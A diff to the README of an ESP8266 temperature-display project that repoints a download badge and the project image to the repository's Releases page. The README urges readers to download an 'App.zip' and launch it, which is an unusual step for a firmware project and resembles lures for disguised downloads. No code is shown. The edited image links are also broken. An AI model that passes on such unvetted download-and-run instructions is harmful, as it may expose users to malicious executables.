@@ -34,7 +34,7 @@ Welcome to the TemperatureDisplay repository! This project focuses on measuring 
 ## Installation 🚀
 
 To get started with this project, download the application from the following link:  
-[![Download App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/Assadullah945/TemperatureDisplay/releases)](https://github.com/Assadullah945/TemperatureDisplay/releases)
 
 If the link ends with the file name, make sure to launch the downloaded application to start using TemperatureDisplay. If the link is not working or the file is not accessible, please check the "Releases" section of this repository for alternate download options.
 
@@ -68,4 +68,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 By leveraging the capabilities of the GXHT30 sensor, SSD1306 OLED display, and ESP8266 platform, TemperatureDisplay provides a comprehensive solution for temperature monitoring and display. Whether you are a DIY enthusiast, an electronics hobbyist, or a smart home enthusiast, this project offers a user-friendly and versatile way to track temperature and humidity values. Get started today and embark on your temperature monitoring journey with TemperatureDisplay! 🌡️🔌
 
-![TemperatureDisplay](https://example.com/image.jpg)
+![TemperatureDisplay](https://github.com/Assadullah945/TemperatureDisplay/releases)
